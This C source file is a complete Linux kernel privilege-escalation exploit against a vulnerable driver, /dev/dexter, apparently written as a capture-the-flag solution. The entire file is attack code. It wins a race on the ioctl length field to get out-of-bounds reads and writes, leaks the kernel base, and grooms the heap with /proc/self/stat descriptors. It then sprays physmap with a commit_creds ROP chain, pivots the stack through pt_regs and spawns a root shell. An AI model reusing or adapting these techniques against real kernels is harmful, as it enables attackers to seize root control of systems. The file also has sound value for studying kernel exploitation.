/*
 * pt_regs + ret2dir
 * not working when KASLR enabled
 */

#define _GNU_SOURCE
#include <fcntl.h>      // for open, O_RDONLY, O_RDWR
#include <pthread.h>    // for pthread_barrier_destroy, pthread_barrier_wait
#include <sched.h>      // for sched_setaffinity, sched_yield, CPU_SET, CPU_...
#include <stdbool.h>    // for true
#include <stdint.h>     // for uintptr_t, uint8_t, uint64_t
#include <stdio.h>      // for NULL, printf, puts, size_t
#include <stdlib.h>     // for free, malloc, EXIT_SUCCESS
#include <string.h>     // for memcmp, memset, memcpy
#include <sys/ioctl.h>  // for ioctl
#include <sys/mman.h>   // for mmap, MAP_ANONYMOUS, MAP_POPULATE, MAP_PRIVATE
#include <unistd.h>     // for close, execve, read

/* Return frame for iretq */
uintptr_t cs;
uintptr_t rflags;
uintptr_t rsp;
uintptr_t ss;

#define BUFFER_SIZE 0x20
#define CMD_GET 0xdec50001
#define CMD_SET 0xdec50002

#define SPRAY_PAGES 0x1850

uintptr_t offset;
#define OFFSET(addr) (addr + offset)

static int device;
static int victim_fd;
static pthread_barrier_t barrier;

volatile struct {
	uint8_t *ptr;
	uint64_t len;
} req;

#define mov_rax_i_ret			0xffffffff81139eb0 // i: 0x4000000000000
#define add_rsp_0x190_ret		0xffffffff8123b9fe
#define pop_rsp_ret			0xffffffff8103b6e4
#define pop_rdi_or_dh_dh_ret		0xffffffff8110ffc2
#define prepare_kernel_cred		0xffffffff810729b0
#define pop_rcx_ret			0xffffffff8110d88b
#define mov_rdi_rax_rep_movsq_ret	0xffffffff8163d0ab
#define commit_creds			0xffffffff81072810
#define kpti_pop_rax_pop_rdi		0xffffffff81800e26

static void shell(void)
{
	puts("[+] get r00t!");
	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
}

static void save_state(void)
{
	asm volatile("movq %%cs, %[cs]\n\t"
		     "pushfq\n\t"
		     "popq %[rflags]\n\t"
		     "movq %%rsp, %[rsp]\n\t"
		     "movq %%ss, %[ss]"
		     : [cs] "=r"(cs), [rflags] "=r"(rflags), [rsp] "=r"(rsp),
		       [ss] "=r"(ss));
}

static void cpu_pin(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	sched_setaffinity(0, sizeof(set), &set);
}

static void *race_len(void *arg)
{
	uint64_t len = (uint64_t)arg;

	cpu_pin(1);
	pthread_barrier_wait(&barrier);
	sched_yield();
	req.len = len;
	return NULL;
}

static void oobr(uint8_t *ptr, uint64_t len)
{
	uint64_t data_len = len + BUFFER_SIZE;
	uint8_t zero[BUFFER_SIZE] = { 0 };
	uint8_t *data = malloc(data_len);
	pthread_t tid;
	int ret;

	while (true) {
		req.ptr = data;
		req.len = BUFFER_SIZE;
		memset(data, 0, data_len);

		pthread_barrier_init(&barrier, NULL, 2);
		ret = pthread_create(&tid, NULL, race_len, (void *)data_len);
		if (ret != 0)
			goto err;

		pthread_detach(tid);

		pthread_barrier_wait(&barrier);
		ret = ioctl(device, CMD_GET, &req);
		if (ret < 0)
			goto err;

		if (memcmp(&data[len], zero, BUFFER_SIZE) != 0) {
			printf("[+] oobr success\n");
			pthread_barrier_destroy(&barrier);
			memcpy(ptr, data, len);
			break;
		}

err:
		pthread_barrier_destroy(&barrier);
	}

	free(data);
}

static void oobw(uint8_t *ptr, uint64_t len)
{
	uint8_t *buf = malloc(len);
	pthread_t tid;
	int ret;

	while (true) {
		req.ptr = ptr;
		req.len = BUFFER_SIZE;
		memset(buf, 0, len);

		pthread_barrier_init(&barrier, NULL, 2);
		ret = pthread_create(&tid, NULL, race_len, (void *)len);
		if (ret != 0)
			goto err;

		pthread_detach(tid);

		pthread_barrier_wait(&barrier);
		ret = ioctl(device, CMD_SET, &req);
		if (ret < 0)
			goto err;

		oobr(buf, len);
		if (memcmp(ptr, buf, len) == 0) {
			printf("[+] oobw success\n");
			pthread_barrier_destroy(&barrier);
			break;
		}

err:
		pthread_barrier_destroy(&barrier);
	}

	free(buf);
}

static void heap_fengshui(void)
{
	uint8_t data[0x40] = { 0 };
	int spray_fd[100];

	while (true) {
		device = -1;
		victim_fd = -1;
		for (int i = 0; i < 100; ++i)
			spray_fd[i] = -1;

		for (int i = 0; i < 50; ++i)
			spray_fd[i] = open("/proc/self/stat", O_RDONLY);

		device = open("/dev/dexter", O_RDWR);

		for (int i = 50; i < 100; ++i)
			spray_fd[i] = open("/proc/self/stat", O_RDONLY);

		if (device < 0)
			goto err;

		oobr(data, 0x40);
		offset = *(uintptr_t *)&data[0x20] - 0xffffffff81170f80;
		printf("[+] offset: %#lx\n", offset);

		*(uintptr_t *)&data[0x38] = OFFSET(mov_rax_i_ret); // show
		oobw(data, 0x40);

		for (int i = 0; i < 100; ++i) {
			int fd = spray_fd[i];

			if (fd > 0) {
				size_t n = read(fd, data, 1);
				if (n) {
					close(fd);
					spray_fd[i] = -1;
				} else {
					victim_fd = fd;
				}
			}
		}

		if (victim_fd < 0)
			goto err;

		printf("[+] heap fengshui success\n");
		break;

err:
		if (device > 0)
			close(device);
		for (int i = 0; i < 100; ++i) {
			if (spray_fd[i] > 0)
				close(spray_fd[i]);
		}
	}
}

static void rop_chain(uintptr_t *ptr)
{
	*ptr++ = OFFSET(pop_rdi_or_dh_dh_ret);
	*ptr++ = (uintptr_t)NULL;
	*ptr++ = OFFSET(prepare_kernel_cred);
	*ptr++ = OFFSET(pop_rcx_ret);
	*ptr++ = 0;
	*ptr++ = OFFSET(mov_rdi_rax_rep_movsq_ret);
	*ptr++ = OFFSET(commit_creds);
	*ptr++ = OFFSET(kpti_pop_rax_pop_rdi);
	*ptr++ = 0;
	*ptr++ = 0;
	*ptr++ = (uintptr_t)shell;
	*ptr++ = cs;
	*ptr++ = rflags;
	*ptr++ = rsp;
	*ptr++ = ss;
}

static void physmap_spray(void)
{
	uintptr_t *mm;

	for (int i = 0; i < SPRAY_PAGES; ++i) {
		mm = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
			  MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
		if ((void *)mm != (void *)-1)
			rop_chain(mm);
	}
}

static void sys_read(void)
{
	uint8_t data = 0;

	asm volatile("movq %[pop_rsp], %%rbp\n\t"
		     "movq $0xffff888003600000, %%rbx\n\t"
		     "movq $0x00, %%rax\n\t"
		     "movq $0x01, %%rdx\n\t"
		     "movq %[data], %%rsi\n\t"
		     "movl %[victim_fd], %%edi\n\t"
		     "syscall"
		     :
		     : [pop_rsp] "r"(OFFSET(pop_rsp_ret)), [data] "r"(&data),
		       [victim_fd] "r"(victim_fd)
		     : "rax", "rdx", "rsi", "edi");
}

int main(void)
{
	uint8_t data[0x30] = { 0 };

	cpu_pin(0);
	save_state();

	heap_fengshui();

	oobr(data, 0x30);
	*(uintptr_t *)&data[0x28] = OFFSET(add_rsp_0x190_ret);
	oobw(data, 0x30);

	physmap_spray();
	sys_read();

	return EXIT_SUCCESS;
}
